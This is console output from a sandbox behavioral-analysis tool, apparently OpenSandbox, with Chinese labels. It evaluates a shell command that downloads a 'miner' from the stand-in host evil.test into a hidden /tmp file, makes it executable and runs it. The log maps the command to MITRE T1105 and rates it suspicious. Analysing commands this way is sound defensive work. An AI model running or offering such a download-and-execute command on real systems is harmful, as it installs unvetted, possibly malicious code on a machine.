
[1m==========================================
  OpenSandbox Behavioral Analysis Engine v4
==========================================[0m

[0;36m[INFO][0m  待检测命令: curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x

[0;36m[INFO][0m  [Step 1/7] 检查环境...
[0;32m[ OK ][0m Docker: Docker version 27.5.1, build 27.5.1-0ubuntu3~24.04.2
[0;32m[ OK ][0m Python: Python 3.12.3
[0;36m[INFO][0m  安装 uv...
downloading uv 0.10.12 x86_64-unknown-linux-gnu
no checksums to verify
installing to /root/.local/bin
  uv
  uvx
everything's installed!
[0;32m[ OK ][0m uv: uv 0.10.12 (x86_64-unknown-linux-gnu)
[0;36m[INFO][0m  [Step 2/7] 预拉取 Docker 镜像...
[0;32m[ OK ][0m 沙箱镜像: opensandbox/code-interpreter:v1.0.2 (已存在)
[0;32m[ OK ][0m Execd镜像: opensandbox/execd:v1.0.7 (已存在)
[0;36m[INFO][0m  [Step 3/7] 安装 Python 依赖...
[0;32m[ OK ][0m opensandbox-server + SDK 已安装
[0;36m[INFO][0m  [Step 4/7] 生成服务端配置...
[0;32m[ OK ][0m 配置写入: /tmp/tmp.bD9wnT5fCm/sandbox.toml
[0;36m[INFO][0m  [Step 5/7] 启动 OpenSandbox Server...
[0;32m[ OK ][0m Server 就绪 (PID: 697039, port: 8080)
[0;36m[INFO][0m  [Step 6/7] 创建沙箱并执行深度行为分析...

/tmp/tmp.bD9wnT5fCm/checker.py:803: SyntaxWarning: invalid escape sequence '\$'
  "echo '=== cron.d ==='; for f in /etc/cron.d/*; do [ -f \"\$f\" ] && echo \"--- \$f ---\" && cat \"\$f\"; done 2>/dev/null || true; "

============================================================================
  1/9  创建隔离沙箱
============================================================================
  镜像: opensandbox/code-interpreter:v1.0.2
  Sandbox ID: c432d800-fd37-41eb-8db3-a094b28a6b7a

============================================================================
  2/9  安装监控工具 (快照前, 避免污染基线)
============================================================================
  监控工具已安装

============================================================================
  3/9  采集执行前基线 (24 维度)
============================================================================
  文件数       : 221689
  SUID/SGID    : 14
  符号链接     : 483
  文件能力     : 1
  基线采集耗时 : 14.9s
  CPU          : 4.5%
  Memory       : 1885.9/15069.3 MiB

============================================================================
  4/9  启动多层探针 + 执行待测命令
============================================================================
  [探针1] inotify: /usr/local/bin /usr/bin /usr/sbin /etc /root /home
  [探针2] inotify: /tmp /var/tmp /dev/shm (独立探针)
  [探针3] network: /proc/net/tcp 轮询 (0.5s)
  [探针5] process: 进程树轮询 (1s)

  --- 命令链分解分析 ---
    命令包含 3 个执行阶段:
    [1] [OK] curl -fsSL http://evil.test/miner -o /tmp/.x &&
    [2] [OK] chmod +x /tmp/.x &&
    [3] [OK] /tmp/.x END

  --- 命令去混淆分析 ---
    PASS  未发现编码/混淆层

  --- 命令静态分析 ---
    !! [T1105] download to /tmp and make executable (score: 35)

  $ curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x
  ────────────────────────────────────────────────────────────

  耗时     : 1.0s
  退出码   : 6
  stdout   : 0 行
  stderr   : 1 行

  --- stderr (前 30 行) ---
    | curl: (6) Could not resolve host: evil.test

============================================================================
  5/9  采集执行后快照 (全维度)
============================================================================
  文件数       : 221689
  SUID/SGID    : 14
  inotify 系统 : 0 条
  inotify /tmp : 206205 条

============================================================================
  6/9  网络行为深度分析
============================================================================

  --- 外部连接 (出站) ---
    (无外部连接)

    [20 个内部连接已忽略]

  --- DNS 配置 ---
    PASS  /etc/resolv.conf 未被修改

============================================================================
  7/9  全维度安全对比分析 (24 维度)
============================================================================

  --- [D1] 文件变更 (+0 / -0) ---
    (无新增)

  --- [D2] 实时文件事件 (inotifywait) ---
    系统目录: (无事件)
    临时目录事件 (4900 条):
      2026-03-20T04:02:23 CREATE /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9
      2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9

  --- [D3] 用户与权限 ---
    PASS  /etc/passwd, shadow, sudoers, SSH, PAM 无变化

  --- [D4] 持久化 (cron/systemd/rc.local/init.d/at) ---
    PASS  无新增

  --- [D5] Shell 环境 (.bashrc/.profile/etc) ---
    PASS  无变化

  --- [D6] 进程树分析 ---
    观察到 15 个独立进程:
      > /opt/opensandbox/execd
      > COMMAND
      > \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf
      > \_ bash -c find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null | sort
      > \_ bash -c find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} \; 2>/dev/null | sort || true
      > \_ bash -c getcap -r / 2>/dev/null | sort || true
      > \_ cat /proc/net/tcp /proc/net/tcp6
      > \_ find / -xdev ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;
      > \_ getcap -r /
      > \_ sort
      > tail -f /dev/null
      > |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
      > |   \_ find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} ;
      > |   \_ getcap -r /
      > |   \_ sort

    残留进程 (执行后):
      USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
      root           1  0.0  0.0   3156  1792 ?        Ss   04:01   0:00 tail -f /dev/null
      root           7 18.4  0.1 1243968 22208 ?       Sl   04:01   0:06 /opt/opensandbox/execd
      root         839  0.0  0.0   4752  3584 ?        S    04:02   0:00  \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf '%s %T@ %p\n' 2>/dev/null | sort
      root         840  0.0  0.0   4084  2432 ?        R    04:02   0:00  |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
      root         842  0.0  0.0  24904  3328 ?        S    04:02   0:00  |   \_ sort
      root         841  0.0  0.0   4752  3584 ?        S    04:02   0:00  \_ bash -c ps auxf 2>/dev/null || ps aux
      root         843  0.0  0.0   8280  4224 ?        R    04:02   0:00  |   \_ ps auxf
      root         844  0.0  0.0   4752  3328 ?        R    04:02   0:00  \_ bash -c cat ~/.bashrc ~/.bash_profile ~/.profile ~/.bash_logout /etc/profile /etc/bash.bashrc /etc/environment /etc/profile.d/*.sh 2>/dev/null | md5sum

  --- [D7] 残留网络连接 ---
        sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
         0: 0100007F:915A 0100007F:AEE4 01 00000000:00000000 02:00000346 00000000     0        0 4448411 2 0000000000000000 20 4 30 10 -1                  
         1: 0100007F:E988 0100007F:AEE4 01 00000000:00000000 02:00000819 00000000     0        0 4453952 2 0000000000000000 20 4 30 10 -1                  
         2: 0100007F:CE94 0100007F:AEE4 01 00000000:00000000 02:000004C2 00000000     0        0 4438347 2 0000000000000000 20 4 30 10 -1                  
         3: 0100007F:CE88 0100007F:AEE4 01 00000000:00000000 02:0000022E 00000000     0        0 4432709 2 0000000000000000 20 4 30 10 -1                  
         4: 0100007F:E992 0100007F:AEE4 01 00000000:00000000 02:00000A12 00000000     0        0 4459233 2 0000000000000000 20 4 30 10 -1                  
         5: 020011AC:83B4 185CBD5B:0050 06 00000000:00000000 03:0000014D 00000000     0        0 0 3 0000000000000000                                      
         6: 0100007F:9158 0100007F:AEE4 01 00000000:00000000 02:000002DF 00000000     0        0 4438866 2 0000000000000000 20 4 30 10 -1                  
         7: 0100007F:8BBA 0100007F:AEE4 01 00000000:00000000 02:0000002A 00000000     0        0 4436950 2 0000000000000000 20 4 30 10 -1                  
         8: 0100007F:CEC0 0100007F:AEE4 01 00000000:00000000 02:0000022E 00000000     0        0 4433762 2 0000000000000000 20 4 30 10 -1                  
         9: 020011AC:B6DE 51BE7DB9:0050 06 00000000:00000000 03:00000000 00000000     0        0 0 3 0000000000000000                                      
        10: 0100007F:8C02 0100007F:AEE4 01 00000000:00000000 02:0000002C 00000000     0        0 4442016 2 0000000000000000 20 4 30 10 -1                  
        11: 0100007F:CE66 0100007F:AEE4 01 00000000:00000000 02:000001B2 00000000     0        0 4433711 2 0000000000000000 20 4 30 10 -1                  
        12: 0100007F:CEC8 0100007F:AEE4 01 00000000:00000000 02:00000235 00000000     0        0 4437452 2 0000000000000000 20 4 30 10 -1                  
        13: 0100007F:8BF2 0100007F:AEE4 01 00000000:00000000 02:0000002C 00000000     0        0 4442015 2 0000000000000000 20 4 30 10 -1                  

  --- [D8] 资源消耗 ---
    CPU    : 4.5% -> 2.9% (Δ -1.6%)
    Memory : 1885.9 -> 1919.0 MiB (Δ +33.0 MiB)

  --- [D9] 可疑二进制 (/tmp /var/tmp /dev/shm) ---
    PASS

  --- [D10] SUID/SGID 文件变更 ---
    PASS  无新增 SUID/SGID 文件

  --- [D11] 内核模块 ---
    PASS  无变化

  --- [D12] 挂载点 ---
    PASS  无变化

  --- [D13] 安全相关环境变量 ---
    PASS  无变化

  --- [D14] 关键文件内容分析 ---
    PASS  未发现恶意内容模式

  --- [D15] 关键系统二进制完整性 ---
    PASS  /bin/bash, su, sudo, passwd, sshd 等均未被篡改

  --- [D16] 符号链接变更 ---
    PASS  无新增符号链接

  --- [D17] 文件能力 (Linux Capabilities) ---
    PASS  无新增文件能力

  --- [D18] 输出内容分析 ---
    PASS  输出内容无敏感信息泄露

  --- [D19] 新增文件熵分析 ---
    PASS  无异常高熵文件

  --- [D20] 计划任务详细差异 ---
    PASS  计划任务无变化

  --- [D21] 隐藏进程检测 ---
    PASS  未发现隐藏进程

  --- [D22] 信号处理 / trap 分析 ---
    PASS  未发现恶意信号处理

  --- [D23] 攻击链关联分析 ---
    PASS  未检测到攻击链组合

  --- [D24] 敏感文件权限变更 ---
    PASS  敏感文件权限正常

============================================================================
  8/9  MITRE ATT&CK 技术映射
============================================================================
    [T1105] Ingress Tool Transfer
      └─ 命令匹配恶意模式: download to /tmp and make executable

============================================================================
  9/9  综合判定
============================================================================

  +──────────────────────────────────────────────────────────────────────────+
  |  [??] 判定: SUSPICIOUS            风险评分:  35/100            |
  |  [██████████████░░░░░░░░░░░░░░░░░░░░░░░░░░]                              |
  |  置信度: LOW     维度覆盖:  1/24              |
  +──────────────────────────────────────────────────────────────────────────+

  命令           : curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x
  合法命令模式   : 否
  退出码         : 6
  文件 +/-       : +0 / -0
  inotify 事件   : 0 系统 + 4900 临时
  外部连接       : 0 个
  SUID/SGID 变更 : +0
  二进制完整性   : PASS
  新增符号链接   : 0
  新增文件能力   : 0
  执行耗时       : 1.0s
  MITRE 技术     : 1 个
  ATT&CK 战术    : Command and Control
  发现           : 1 critical, 0 warnings, 0 info
  置信度         : LOW

  详细发现 (按严重程度排序):
    [!!!] [静态分析] 命令匹配恶意模式: download to /tmp and make executable [T1105] (score: 35)

  安全建议:
    -> REVIEW: 建议人工审核此命令后再决定是否放行
    -> 置信度较低, 可能为误报, 请结合上下文判断

  报告 (JSON) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979378.json
  报告 (文本) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979378.txt
  报告 (SARIF): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979378.sarif.json

  快速预判: REVIEW (静态分: 35, 模式匹配: 1)

============================================================================
  人类可读摘要:
============================================================================
  ⚠️ 判定: SUSPICIOUS (风险分: 35/100, 置信度: LOW)
  命令: curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x
  
  发现 1 个问题 (1 严重, 0 警告):
    [CRITICAL] 静态分析: 命令匹配恶意模式: download to /tmp and make executable [T1105]
  
  涉及 ATT&CK 战术: Command and Control
  
  建议:
    • REVIEW: 建议人工审核此命令后再决定是否放行
    • 置信度较低, 可能为误报, 请结合上下文判断

  沙箱已销毁。


[0;36m[INFO][0m  [Step 7/7] 完成!
[0;32m[ OK ][0m 报告 (JSON): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979378.sarif.json
  查看: python3 -m json.tool /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979378.sarif.json
  快速预判: FAST_TRIAGE=1 COMMAND='...' ./checker.sh

[0;36m[INFO][0m  Cleaning up...
[0;32m[ OK ][0m Cleanup done.
